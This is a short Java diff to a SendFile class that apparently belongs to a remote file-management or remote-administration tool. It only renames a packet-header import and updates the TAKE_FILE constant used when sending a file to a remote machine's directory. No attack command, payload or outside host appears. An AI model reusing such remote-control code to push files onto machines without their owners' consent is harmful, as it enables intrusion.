@@ -4,8 +4,8 @@ import java.io.File;
 
 import com.redpois0n.common.io.FileIO;
 import com.redpois0n.common.io.TransferListener;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.ui.frames.FrameFileTransfer;
 import com.redpois0n.ui.frames.FrameRemoteFiles;
 import com.redpois0n.utils.Util;
@@ -26,7 +26,7 @@ public class SendFile {
 		}
 
 		try {
-			PacketBuilder builder = new PacketBuilder(Header.TAKE_FILE);
+			PacketBuilder builder = new PacketBuilder(OutgoingHeader.TAKE_FILE);
 			
 			builder.add(destdir);
 			builder.add(file.getName());
